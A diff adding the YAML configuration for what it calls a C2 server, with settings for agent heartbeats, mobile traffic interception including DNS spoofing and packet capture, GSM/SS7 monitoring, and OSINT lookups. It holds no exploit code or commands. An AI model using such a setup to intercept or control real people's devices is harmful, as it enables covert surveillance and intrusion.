@@ -1,0 +1,104 @@
+# B13 C2 Server Consolidated Configuration
+
+# Server Settings
+server:
+  host: ${SERVER_HOST:-0.0.0.0}
+  port: ${SERVER_PORT:-5001}
+  debug: ${DEBUG:-false}
+  environment: ${ENVIRONMENT:-production}
+
+# Security Settings
+security:
+  jwt:
+    secret: ${JWT_SECRET}
+    cookie_secure: ${JWT_COOKIE_SECURE:-true}
+    csrf_protect: ${JWT_CSRF_PROTECT:-true}
+    cookie_name: access_token
+    cookie_path: /
+    token_expires: ${JWT_TOKEN_EXPIRES:-3600}
+  encryption:
+    key: ${ENCRYPTION_KEY}
+    salt_rounds: ${SALT_ROUNDS:-12}
+  cors:
+    allowed_origins: ${CORS_ORIGINS:-"*"}
+    allowed_headers: ["Content-Type", "Authorization", "X-Requested-With"]
+    allowed_methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"]
+    max_age: ${CORS_MAX_AGE:-86400}
+  api_rate_limit:
+    calls_per_minute: ${RATE_LIMIT_CALLS:-100}
+    max_attempts: ${RATE_LIMIT_ATTEMPTS:-3}
+    backoff_factor: ${RATE_LIMIT_BACKOFF:-1}
+    max_delay: ${RATE_LIMIT_DELAY:-30}
+
+# Database Settings
+database:
+  uri: ${DB_URI:-mongodb://localhost:27017/}
+  name: ${DB_NAME:-c2_server}
+  connection_timeout: ${DB_TIMEOUT:-5000}
+
+# Mobile Interception Settings
+mobile_interception:
+  enabled: ${MOBILE_INTERCEPTION_ENABLED:-true}
+  interface: ${MOBILE_INTERFACE:-eth0}
+  dns_spoofing: ${DNS_SPOOFING:-true}
+  http_interception: ${HTTP_INTERCEPTION:-true}
+  packet_capture: ${PACKET_CAPTURE:-true}
+  max_sessions: ${MAX_SESSIONS:-100}
+
+# GSM/SS7 Settings
+gsm_ss7:
+  protocols:
+    - GSM
+    - SS7
+    - IP
+  monitoring_interval: ${MONITORING_INTERVAL:-10}
+  error_retry_delay: ${ERROR_RETRY_DELAY:-5}
+  max_retries: ${MAX_RETRIES:-3}
+
+# Logging Settings
+logging:
+  level: ${LOG_LEVEL:-INFO}
+  file: ${LOG_FILE:-c2_server.log}
+  max_size: ${LOG_MAX_SIZE:-100MB}
+  backup_count: ${LOG_BACKUP_COUNT:-5}
+  format: '%(asctime)s - %(levelname)s - %(message)s'
+  datefmt: '%Y-%m-%d %H:%M:%S'
+
+# Agent Settings
+agent:
+  timeout: ${AGENT_TIMEOUT:-300}
+  heartbeat_interval: ${HEARTBEAT_INTERVAL:-30}
+  max_retries: ${AGENT_MAX_RETRIES:-3}
+  connection_pool_size: ${POOL_SIZE:-10}
+
+# Network Settings
+network:
+  max_connections: ${MAX_CONNECTIONS:-100}
+  buffer_size: ${BUFFER_SIZE:-4096}
+  listen_backlog: ${LISTEN_BACKLOG:-128}
+  keepalive_timeout: ${KEEPALIVE_TIMEOUT:-300}
+
+# Monitoring Settings
+monitoring:
+  enabled: ${MONITORING_ENABLED:-true}
+  interval: ${MONITORING_INTERVAL:-60}
+  max_history: ${MONITORING_HISTORY:-1000}
+
+# OSINT Settings
+osint:
+  enabled: ${OSINT_ENABLED:-true}
+  providers:
+    - shodan
+    - censys
+    - virustotal
+  api_keys:
+    shodan: ${SHODAN_API_KEY}
+    censys: ${CENSYS_API_KEY}
+    virustotal: ${VT_API_KEY}
+
+# Tools Settings
+tools:
+  enabled: ${TOOLS_ENABLED:-true}
+  max_processes: ${MAX_PROCESSES:-50}
+  timeout: ${TOOL_TIMEOUT:-300}
+  retry_delay: ${TOOL_RETRY_DELAY:-5}
